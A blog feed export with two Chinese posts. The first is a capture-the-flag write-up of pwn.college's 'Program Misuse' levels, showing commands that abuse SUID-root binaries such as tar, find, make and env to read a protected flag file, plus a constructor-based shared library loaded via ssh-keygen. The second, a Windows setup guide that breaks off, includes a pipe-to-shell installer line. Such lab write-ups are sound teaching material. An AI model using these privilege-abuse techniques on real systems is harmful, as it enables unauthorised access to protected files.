    <url>/p/7b0851b2/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/pwn-college.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在做完本节后，你将会：</p><ul><li>熟悉linux命令的使用</li><li>知晓假设<strong>某命令对应的二进制文件是suid程序的情况下</strong>，可以如何得到flag。这些命令包括但是不限于：<ul><li>ssh-keygen（怪起来了）</li><li>Makefile<br>这个或许有用：<a href="https://gtfobins.github.io/">GTFOBins</a><br><a href="https://github.com/GTFOBins/GTFOBins.github.io">GitHub - GTFOBins/GTFOBins.github.io: GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems</a><h2 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h2></li></ul></li></ul><p>通过YouTube视频和slides的方式，讲解了</p><ul><li>linux命令行</li><li>文件、进程</li><li>软硬链接、管道</li><li>suid的基本原理</li><li>suid攻击的缓解措施</li></ul><h3 id="mitigation"><a href="#mitigation" class="headerlink" title="mitigation"></a>mitigation</h3><ul><li>eUID（Effective User ID）：表示正在执行命令的进程的有效用户ID。</li><li>rUID（Real User ID）：表示正在执行命令的进程的真实用户ID。</li></ul><p>在这种情况下，如果<code>/bin/sh</code>被设置为SUID权限（suid标志被设置，即eUID为0但rUID不为0），它将降低权限到rUID。也就是说，eUID将被设置为rUID的值，而rUID不为0。</p><p>为了禁用这种行为，可以使用<code>sh -p</code>命令来执行<code>/bin/sh</code>。<code>-p</code>选项将使<code>/bin/sh</code>保持SUID权限，而不会降低为rUID。</p><h2 id="Program-Misuse"><a href="#Program-Misuse" class="headerlink" title="Program Misuse"></a><a href="https://dojo.pwn.college/fundamentals/program-misuse">Program Misuse</a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul><li>题目在dojos里面</li><li>workspace提供一个容器内的vscode</li></ul><p>通过执行提供的/challenge/babysuid程序，我们可以将某一命令设置为setuid程序（尽管它之前不是）。比如，在level1中，在你运行/challenge/babysuid程序后，就会将cat设置为setuid程序（每个官卡将不同的二进制文件设置为setuid程序），这样的话你在运行cat的时候会得到root的权限，从而得到/flag的内容</p><p>我们可以把babysuid程序放到ida看一下，它本质上是执行了chmod函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to %s!\n\n&quot;</span>, *argv);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is part of a series of programs that&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exposes you to very simple programs that let you directly read the flag.&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( chmod(<span class="hljs-string">&quot;/usr/bin/head&quot;</span>, <span class="hljs-number">04755u</span>) )<br>    __assert_fail(<span class="hljs-string">&quot;chmod(\&quot;/usr/bin/head\&quot;, 04755) == 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0xD</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_20DB);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I just set the SUID bit on /usr/bin/head.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try to use it to read the flag!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_20DB);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;IMPORTANT: make sure to run me (%s) every time that you restart\n&quot;</span><br>    <span class="hljs-string">&quot;this challenge container to make sure that I set the SUID bit on /usr/bin/head!\n&quot;</span>,<br>    *argv);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="略"><a href="#略" class="headerlink" title="略"></a>略</h2><ul><li>emacs的退出命令：c-x，c-c</li><li>od（octal dump）</li><li>hd（hex dump）</li><li>xxd</li></ul><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出</p><p>由于flag只有一行，因此直接sort即可</p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">rev</span> /flag | <span class="hljs-built_in">rev</span><br></code></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>base64同理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">base32 /flag | base32 -d <br>pwn.college&#123;gxSMD4Ps0hot1Rq1Zs1MNCY9f51.0lN1EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ tldr base32<br>base32<br>Encode or decode <span class="hljs-keyword">file</span> or standard input to<span class="hljs-regexp">/from Base32, to standard output.More information: https:/</span><span class="hljs-regexp">/www.gnu.org/</span>software<span class="hljs-regexp">/coreutils/</span>base32.<br><br> - Encode a <span class="hljs-keyword">file</span>:<br>   base32 &#123;&#123;path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span>&#125;&#125;<br><br> - Decode a <span class="hljs-keyword">file</span>:<br>   base32 --decode &#123;&#123;path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span>&#125;&#125;<br><br> - Encode <span class="hljs-keyword">from</span> stdin:<br>   &#123;&#123;somecommand&#125;&#125; | base32<br><br> - Decode <span class="hljs-keyword">from</span> stdin:<br>   &#123;&#123;somecommand&#125;&#125; | base32 --decode<br></code></pre></td></tr></table></figure><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">- Split <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> with at most <span class="hljs-number">512</span> bytes in each <span class="hljs-keyword">split</span> without breaking <span class="hljs-built_in">line</span><span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">split</span> -C &#123;&#123;<span class="hljs-number">512</span>&#125;&#125; &#123;&#123;path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span>&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs applescript">hacker@program-misuse-level<span class="hljs-number">-16</span>:~$ /challenge/babysuid_level16 <br>Welcome <span class="hljs-keyword">to</span> /challenge/babysuid_level16!<br><br>This challenge <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a series <span class="hljs-keyword">of</span> programs <span class="hljs-keyword">that</span><br>require you <span class="hljs-keyword">to</span> understand their output <span class="hljs-keyword">to</span> derive <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">from</span> <span class="hljs-keyword">it</span>.<br><br>I just <span class="hljs-keyword">set</span> <span class="hljs-keyword">the</span> SUID bit <span class="hljs-keyword">on</span> /usr/bin/split.<br>Try <span class="hljs-keyword">to</span> use <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">read</span> <span class="hljs-keyword">the</span> flag!<br><br>IMPORTANT: make sure <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> <span class="hljs-keyword">me</span> (/challenge/babysuid_level16) <span class="hljs-keyword">every</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">that</span> you restart<br>this challenge container <span class="hljs-keyword">to</span> make sure <span class="hljs-keyword">that</span> I <span class="hljs-keyword">set</span> <span class="hljs-keyword">the</span> SUID bit <span class="hljs-keyword">on</span> /usr/bin/split!<br>hacker@program-misuse-level<span class="hljs-number">-16</span>:~$ split -C <span class="hljs-number">512</span> /flag<br></code></pre></td></tr></table></figure><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">17</span>:~$ gzip /flag<br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">17</span>:~$ gzip -dc /flag.gz <br><span class="hljs-attribute">pwn</span>.college&#123;MFi<span class="hljs-number">6</span>oRehJ<span class="hljs-number">1</span>enJ<span class="hljs-number">9</span>G<span class="hljs-number">4</span>u<span class="hljs-number">13</span>CwY<span class="hljs-number">2</span>kTwP.<span class="hljs-number">0</span>VO<span class="hljs-number">1</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bzip2<br>A block-sorting <span class="hljs-keyword">file</span> compressor.More information: https:<span class="hljs-comment">//manned.org/bzip2.</span><br><br> - Compress a <span class="hljs-keyword">file</span>:<br>   bzip2 &#123;&#123;path<span class="hljs-regexp">/to/</span>file_to_compress&#125;&#125;<br><br> - Decompress a <span class="hljs-keyword">file</span>:<br>   bzip2 -d &#123;&#123;path<span class="hljs-regexp">/to/</span>compressed_file.bz2&#125;&#125;<br>   <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">18</span>:~$ bzip /flag <br><span class="hljs-attribute">bash</span>: bzip: command not found<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">18</span>:~$ bzip<span class="hljs-number">2</span> -dc /flag.bz<span class="hljs-number">2</span> <br><span class="hljs-attribute">pwn</span>.college&#123;wyRCyHmThng<span class="hljs-number">7</span>Pg<span class="hljs-number">1</span>OX<span class="hljs-number">4</span>z<span class="hljs-number">4</span>RJWuuyx.<span class="hljs-number">0</span>FM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">19</span>:~$ zip /flag.zip /flag<br>  <span class="hljs-attribute">adding</span>: flag (stored <span class="hljs-number">0</span>%)<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">19</span>:~$ unzip -p /flag.zip <br><span class="hljs-attribute">pwn</span>.college&#123;<span class="hljs-number">0</span>R<span class="hljs-number">4</span>OhQA-x_<span class="hljs-number">5</span>UMN<span class="hljs-number">8</span>sAflvCz<span class="hljs-number">6</span>oY_<span class="hljs-number">2</span>.<span class="hljs-number">0</span>VM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">20</span>:~$ tar cf  flag.tar /flag <br><span class="hljs-attribute">tar</span>: Removing leading `/&#x27; from member names<br><br><span class="hljs-attribute">hacker</span>@program-misuse-level-<span class="hljs-number">20</span>:~$ tar -Oxf /flag.tar <br><span class="hljs-attribute">pwn</span>.college&#123;<span class="hljs-number">0</span>wrGqibZPayLku_gULJTTouTS-v.<span class="hljs-number">0</span>lM<span class="hljs-number">2</span>EDL<span class="hljs-number">1</span>cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-21</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ar rc /flag.a /flag<br><br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-21</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /flag.a<br>!&lt;arch&gt;<br>flag/           0           0     0     <span class="hljs-number">644</span>     <span class="hljs-number">57</span>        `<br>pwn.college&#123;E9WpzjytNHsOVvNqE00EOhYj8_e.01M2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"> - Take a list of file names from standard input and add them [o]nto an archive in cpio&#x27;s binary format:</span><br><span class="xml">   echo &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file1</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file2</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">file3</span>&#125;&#125;</span><span class="xml">&quot; | cpio -o</span><br><span class="xml"></span><br><span class="xml">hacker@program-misuse-level-22:~$ echo &quot;/flag&quot; | cpio -o</span><br><span class="xml">�qAL�Kd �9/flagpwn.college&#123;YgoO6RpYImK7IRO7shIK4vqtlfS.0FN2EDL1cTMzEzW&#125;</span><br><span class="xml">�q</span><br><span class="xml">  TRAILER!!!1 block</span><br></code></pre></td></tr></table></figure><h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">$ genisoimage -<span class="hljs-keyword">sort</span> <span class="hljs-string">&quot;/flag&quot;</span><br>genisoimage: Incorrect <span class="hljs-keyword">sort</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">format</span><br>        pwn.college&#123;kzc9UQAHvuDmIhGmMDx8FFy7s_Z<span class="hljs-number">.0</span>VN2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><code>env</code> 命令可以用于在执行命令或脚本时设置环境变量。当使用 <code>env</code> 命令时，它会将其参数作为命令或脚本的参数，并在执行该命令或脚本时设置环境变量。</p><p>如果将 <code>env</code> 命令与可执行程序一起使用，则该程序的参数将作为 <code>env</code> 命令的参数，并且 <code>env</code> 命令将设置环境变量并运行该程序。例如，假设有一个名为 <code>myprogram</code> 的可执行文件，并且需要在运行该程序时设置环境变量 <code>MYVAR</code> 的值为 <code>myvalue</code>，可以像这样使用 <code>env</code> 命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">MYVAR</span>=myvalue ./myprogram<br></code></pre></td></tr></table></figure><p>这将在运行 <code>myprogram</code> 时设置环境变量 <code>MYVAR</code> 的值为 <code>myvalue</code>。<code>./myprogram</code> 表示在当前目录中查找 <code>myprogram</code> 可执行文件。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>vim <span class="hljs-number">1</span>.c <br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gcc <span class="hljs-number">1</span>.c -o readflag<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +s readflag<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ll readflag <br>-rwsr-sr-x <span class="hljs-number">1</span> hacker hacker <span class="hljs-number">16736</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> readflag*<br>hacker<span class="hljs-variable">@program</span>-misuse-level<span class="hljs-number">-24</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>env ./readflag <br>pwn.college&#123;AzBwMP3gKlrGD07PGsT5K-08ZIQ.0lN2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@program-misuse-level-<span class="hljs-number">25</span>:~$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/find /</span> -name flag -exec cat &#123;&#125; \;<br>cat: <span class="hljs-regexp">/opt/</span>radare2<span class="hljs-regexp">/libr/</span>flag: Is a directory<br>cat: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>radare2<span class="hljs-regexp">/5.8.4/</span>flag: Is a directory<br>cat: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">8</span><span class="hljs-regexp">/dist-packages/</span>pwnlib/flag: Is a directory<br>pwn.college&#123;QFEr6tID0OyL1c-PbyhlCdh4gCj.<span class="hljs-number">01</span>N2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> Makefile <br>read_flag:<br>        <span class="hljs-built_in">cat</span> /flag<br><br><span class="hljs-variable">$</span> make read_flag <br><span class="hljs-built_in">cat</span> /flag<br>pwn.college&#123;MG<span class="hljs-literal">-nUq6j7A43o21RPF_4o7wfED8</span>.<span class="hljs-number">0</span>FO2EDL1cTMzEzW&#125;<br></code></pre></td></tr></table></figure><h2 id="略-1"><a href="#略-1" class="headerlink" title="略"></a>略</h2><h2 id="level-51"><a href="#level-51" class="headerlink" title="level-51"></a>level-51</h2><p>ssh-keygen -D选项可以加载指定的动态链接库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ssh-keygen -D <span class="hljs-string">./lib_inje.so</span><br></code></pre></td></tr></table></figure><p>我们需要编译出一个动态链接库，其中的函数需要加上<code>__attribute__((constructor))</code>关键字，这样的话，加载库的时候就会自动运行该函数，从而获取setuid的值</p><blockquote><p>当将<code>__attribute__((constructor))</code>属性应用于某个函数时，该函数将在main()函数之前自动调用执行，该函数可以用来进行一些初始化的工作或设置等。这个特性通常用于实现在程序运行时自动初始化某些特定的对象或变量等。<code>__attribute__((constructor))</code>属性可以用于C和C++语言中，但是它并不属于标准C/C++，仅仅是GCC编译器的一个扩展特性</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</span><br>    <span class="hljs-comment">//int open(const char *pathname, int flags);</span><br>    sendfile(<span class="hljs-number">1</span>,open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4096</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows all in one：从零开始的Windows快速配置</title>
    <link href="/p/f9220a0b/"/>
    <url>/p/f9220a0b/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/win_1.png"></p><p>最近频繁的重装系统，经常会遇到拿到一个新机器但是不趁手的情况。由于每次都会做重复的工作，干脆写一篇博客，就叫做<strong>从零开始的Windows快速配置</strong>好了</p><h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="开发必备"><a href="#开发必备" class="headerlink" title="开发必备"></a>开发必备</h2><ul><li><a href="https://scoop.sh/">scoop</a><ul><li>win的包管理工具</li><li>可以一行命令装软件，再也不用点wizard中的下一步啦</li></ul></li><li>vscode<ul><li>地表最强编辑器，具有丰富的拓展，拓展插件支持使用账号同步</li></ul></li><li><a href="https://git-scm.com/download/win">git</a> <ul><li>最流行的版本控制工具</li></ul></li><li><a href="https://github.com/2dust/v2rayN/releases">v2rayN</a><ul><li>可能是win上最方便的可视化科学上网软件（clash不服）</li></ul></li><li>wsl2<ul><li>使你在Windows上使用Linux（但是会让你的Windows变成虚拟机，慎重）</li><li><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">点这个更新内核以避免报错</a></li></ul></li><li><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">VMware Workstation Pro</a><ul><li>使用VMware构建具有完整内核的虚拟机</li><li>与<a href="https://releases.ubuntu.com/jammy/">Ubuntu镜像</a>一同食用</li></ul></li><li><a href="https://rufus.ie/zh/">rufus</a><ul><li>优雅简单的烧系统镜像</li></ul></li></ul><h2 id="生产力工具"><a href="#生产力工具" class="headerlink" title="生产力工具"></a>生产力工具</h2><ul><li><a href="https://diskanalyzer.com/download">WizTree</a><ul><li>磁盘分析工具&amp;大文件可视化</li><li>安装包仅4.5MB</li></ul></li><li><a href="https://ditto-cp.sourceforge.io/">Ditto</a><ul><li>一个小巧轻便的剪切板工具</li><li>默认<code>ctrl+~</code>打开历史剪切板窗口</li></ul></li><li><a href="https://www.zotero.org/download/">zotero</a><ul><li>8说了，科研必备</li></ul></li><li><a href="https://www.teamviewer.com/en-us/download/windows/">teamview</a><ul><li>远控</li></ul></li><li>geekuninstaller<ul><li>卸载工具，强大精悍</li></ul></li><li>powertoys<ul><li>一系列生产力工具集合，比如防止休眠，快速预览文件，fancyzone窗口布局等</li></ul></li><li>chrome <ul><li>不用我多说了吧</li><li>插件是灵魂</li></ul></li></ul><p><img src="https://img.gls.show/img/20230727200239.png"></p><ul><li><a href="https://www.sumatrapdfreader.org/free-pdf-reader">sumatra pdf</a><ul><li>轻量化PDF阅读器，安装包只有几MB大小</li></ul></li><li><a href="https://crystalmark.info/en/download/">CrystalDiskMark| CrystalDiskInfo </a><ul><li>磁盘测速、查看磁盘信息</li></ul></li><li><a href="https://www.diskgenius.com/download.php">diskgenius</a><ul><li>数据恢复、资料备份还原及磁盘分割管理</li></ul></li><li><a href="https://filezilla-project.org/download.php#close">FileZilla </a><ul><li>可视化ftp传输</li></ul></li><li><a href="https://www.foobar2000.org/download">foobar2000</a><ul><li>开源的高音质音乐播放器</li></ul></li><li><a href="https://obsproject.com/download">obs</a><ul><li>开源的录屏软件</li></ul></li><li><a href="https://www.cpuid.com/downloads/cpu-z/cpu-z_1.79-en.exe?utm_mediu">cpuid</a><ul><li>查看CPU信息</li></ul></li><li><a href="https://transmissionbt.com/download">transmission</a><ul><li>bt、pt客户端</li></ul></li><li><a href="https://www.voidtools.com/zh-cn/downloads/">everything</a><ul><li>高速索引系统上的所有文件</li></ul></li><li><a href="https://7-zip.org/download.html">7-zip</a><ul><li>开源精巧的压缩软件</li></ul></li><li><a href="https://www.foxmail.com/">foxmail</a><ul><li>优秀的第三方邮件客户端，无广告、稳定</li></ul></li><li><a href="https://shurufa.sogou.com/">搜狗输入法</a><ul><li>用隐私换便利 : (</li></ul></li><li><a href="https://obsidian.md/">obsidian</a><ul><li>这个笔记软件真的是太强了，随便一个功能能说半天</li></ul></li><li>typora<ul><li>入手最简单的md编辑器</li></ul></li><li><a href="https://mathpix.com/">mathpix</a><ul><li>ocr识图成latex公式</li></ul></li><li><a href="https://zh.snipaste.com/">Snipaste</a><ul><li>小巧的截屏软件</li></ul></li><li><a href="https://geekuninstaller.com/download">geek</a><ul><li>专注文件卸载，可以卸掉软件残余和store下载的文件</li></ul></li></ul><p>从微软的官方store可以下载的好东西：</p><ul><li>todo</li><li>pwsh</li><li>wsl2</li><li>snipaste</li><li><a href="https://apps.microsoft.com/store/detail/quicklook/9NV4BS3L1H4S">QuickLook</a></li></ul><p>壁纸：</p><ul><li><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></li><li><a href="https://unsplash.com/">https://unsplash.com/</a></li><li>Steam 上的 wallpaper engine，俗称小红车</li></ul><h1 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h1><p>拿到新电脑，开机，下载鲁大娘，更新驱动</p><p>在微软商店下载pwsh、Windows terminal（wt），在wt中设置pwsh为默认</p><p>在pwsh中安装scoop：<code>iwr -useb get.scoop.sh | iex</code>，发现没速度。需要科学上网才能使用scoop命令，为了科学上网又需要上github下载v2ray，而为了上github又需要更改host</p><p>修改host，使得能进入github，这时候需要修改host手动将github域名映射到ip。</p><ul><li>为了方便找到hosts文件，下载了everything</li></ul><p>进入GitHub，下载v2ray ：<a href="https://github.com/2dust/v2rayN">https://github.com/2dust/v2rayN</a></p><p>在设置中配置好v2ray（登录微信文件传输助手发送并导入订阅）</p><ul><li>配置端口</li><li>配置局域网连接</li></ul><p>访问Google搜索引擎，并同步chrome浏览器</p><p>直接使用scoop search会有点慢，可以安装scoop-search，这个命令加快搜索速度</p><p><strong>正戏开始，scoop一把梭，直接装天装地</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">install </span>vscode zotero rufus <span class="hljs-keyword">ditto </span>teamviewer sumatrapdf filezilla crystaldiskmark crystaldiskinfo foxmail obsidian mathpix geekuninstaller snipaste quicklook 